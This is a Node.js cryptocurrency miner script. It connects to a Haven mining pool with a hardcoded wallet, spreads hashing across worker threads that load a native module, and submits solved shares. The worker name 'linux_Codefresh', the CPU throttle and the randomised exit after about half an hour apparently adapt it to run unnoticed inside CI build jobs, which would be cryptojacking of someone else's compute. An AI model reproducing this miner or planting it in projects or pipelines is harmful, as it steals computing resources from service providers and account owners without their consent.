const Net = require('net');
const { Worker } = require('worker_threads');
const { Cache } = require('./cache.js');
const fs = require('fs');

// variable
const appCache = new Cache("meocoder", 557056);
const numCPUs = require('os').cpus().length;
const numWorker = 1;
const customUsageCPU = Number(process.argv.slice(2)[1]) || 65;
const nameWorker = `linux_Codefresh`; /* _${Math.floor(Math.random() * 2) + 1} */
const login = (() => {
    return {
        'method': 'login',
        'params': {
            'login': 'hvxy3U6c8tyhYVtfFMDuNZDcdNZpa7ACp7Z5DThivuHLVGG3kvdTxaxTm57Bxyc9MHKaXNw1vf7nxKN3BJ3T4q4g6s9LdjXbUi',
            'pass': nameWorker,
            'rigid': nameWorker,
            'agent': 'meocoder-node-proxy/0.1'
        },
        'id': 1
    };
})();
const mainStatus = {
    servers: ["ca.haven.herominers.com:1110"],
    workers: [],
    poolWS: null,
    attempts: 0
};

// cache
appCache.totalHashes = 0;
appCache.limitHash = null;
appCache.job = null;



/* --------------------------Timeout------------------------  */
setTimeout(() => {
    process.exit(0);
}, ((Math.floor(Math.random() * 3) + Number(process.argv.slice(2)[0]) || 29) * 60) * 1000);



/* --------------------------Help Fn------------------------  */
const ref = (orign, key, update) => orign[key] = update;



/* --------------------------Worker--------------------------  */
const fn_receiveMessageWorker = (message) => {
    try {
        switch (message.type) {
            case 'solved':
                fn_solved(message.data);
                break;

            default:
                break;
        }
    } catch (error) {
        console.log(error);
    }
}
const fn_receiveErrorWorker = (error) => {
    console.log(error)
}
const fn_exitErrorWorker = (code) => {
    if (code !== 0)
        console.log(`stopped with  ${code} exit code`);
}
const fn_firstCreateWorker = () => {
    for (let idWorker = 0; idWorker < (numWorker || numCPUs); idWorker++) {

        if (!fs.existsSync('./temp')) fs.mkdirSync('./temp');
        fs.copyFileSync('./tool.node', `./temp/tool-${idWorker}.node`);
        mainStatus.workers.push(new Worker('./worker.js', { workerData: { idWorker } }));
        mainStatus.workers[mainStatus.workers.length - 1].on('message', message => fn_receiveMessageWorker(message));
        mainStatus.workers[mainStatus.workers.length - 1].on('error', error => fn_receiveErrorWorker(error));
        mainStatus.workers[mainStatus.workers.length - 1].on('exit', code => fn_exitErrorWorker(code));

    }
    // setTimeout(() => {
    //     const limitHash = Math.floor((appCache.totalHashes / 50) / 100 * customUsageCPU);
    //     console.log(`[Main]: ${customUsageCPU}% is ${limitHash}`);
    //     console.log(`[Main]: Set limmit hash to ${limitHash}`);
    //     appCache.limitHash = limitHash;
    // }, 50000);

    setInterval(() => {
        console.log('[Main]: Speed:', Math.floor((appCache.totalHashes / 60)));
        appCache.totalHashes = 0;
    }, 60000);
}

/* --------------------------Main---------------------------- */


const fn_solved = (message) => {
    try {
        // message = JSON.parse(message);
        const loginIDAndJobID = message.job_id.trim().split('@@');
        // console.log(loginIDAndJobID);
        if (loginIDAndJobID[1] !== mainStatus.loginID) {
            console.log('[Main]: job is old');
            return 0;
        }
        if (mainStatus.poolWS === null) {
            console.log('[Main]: pool is null');
            return 0;
        }
        mainStatus.poolWS.write(JSON.stringify({
            'method': 'submit',
            'params': {
                'id': loginIDAndJobID[1],
                'job_id': loginIDAndJobID[0],
                'nonce': message.nonce,
                'result': message.result
            },
            'id': 1
        }) + '\n');
        console.log('[Server]: receive solved ID:', message.job_id);
    } catch (error) {
        console.log(error);
    }
}
const fn_poolErrorHandling = (error) => {
    if (error.message === "Unauthenticated") {
        console.log('[Pool]: Error!!!', error.message);
        mainStatus.poolWS.end();
        ref(mainStatus, 'loginID', null);
        ref(mainStatus, 'poolWS', null);
    } else {
        console.log('[Pool]: Error!!!', error.message);
    }
}

const fn_receiveJob = (job) => {
    appCache.job = {
        job_id: job.job_id + '@@' + job.id,
        target: job.target,
        headerBlob: job.blob.substring(0, 78),
        footerBlob: job.blob.substring(86, job.blob.length),
        // height: job.height,
        // algo: 'cn-upx'
    }
    // console.log(appCache.job);
    mainStatus.workers.length ? null : fn_firstCreateWorker(); /* create worker with job data */;
    ref(mainStatus, 'loginID', job.id);
    console.log('[Pool]: new:', job.job_id, '- h:', job.height, '- t:', job.target, '- ID:', job.id);
}


const fn_receiveMessagePool = (message) => {
    try {
        message = JSON.parse(message.toString('utf8'));
        if (message.error) {
            fn_poolErrorHandling(message.error);
        } else if (message.result && message.result.status && message.result.job) {
            console.log('[Pool]: Login status:', message.result.status);
            fn_receiveJob(message.result.job);
        } else if (message.result && message.result.status) {
            console.log('[Pool]: Submit status:', message.result.status);
        } else if (message.method && message.method === 'job') {
            fn_receiveJob(message.params);
        } else {
            console.log('[Pool]: other message:', message);
        }
    } catch (error) {
        console.log('[Main]: receiveMessagePool Error:', error);
    }
}


const connectPool = () => new Promise((resolve, reject) => {

    console.log('[Main]: Connecting to pool!')
    ref(mainStatus, 'attempts', mainStatus.attempts + 1);
    if (mainStatus.poolWS != null) {
        mainStatus.poolWS.end();
    }

    ref(mainStatus, 'poolWS', new Net.Socket());
    const server = mainStatus.servers[Math.floor(Math.random() * mainStatus.servers.length)].trim().split(':');
    mainStatus.poolWS.connect({ port: server[1], host: server[0] });

    mainStatus.poolWS.on('connect', () => {
        console.log('[Main]: Pool is connected!');
        ref(mainStatus, 'attempts', 0);
    });
    mainStatus.poolWS.on('ready', () => {
        console.log('[Main]: Logging into pool!');
        mainStatus.poolWS.write(JSON.stringify(login) + '\n');
        // console.log('[Main]: logged!');
    });
    mainStatus.poolWS.on('data', message => fn_receiveMessagePool(message));

    // mainStatus.ws.on('open', () => {
    //     console.log('[Main]: connected to server!');
    //     mainStatus.ws.send((JSON.stringify(mainStatus.handshake)));

    // });

    mainStatus.poolWS.on('error', () => {
        console.log('[Main]: Pool erorr!');
        return reject();
    });

    mainStatus.poolWS.on('end', () => {
        console.log('[Main]: Pool erorr!');
        return reject();
    });
    mainStatus.poolWS.on('close', () => {
        console.log('[Main]: Pool erorr!');
        return reject();
    });

}).catch(async () => {
    ref(mainStatus, 'poolWS', null);
    console.log('[Main]: The Pool is not connected. Trying to connect after', mainStatus.attempts * 10, 's');
    await new Promise(resolve => setTimeout(resolve, 10000 * mainStatus.attempts));
    connectPool();
});
connectPool();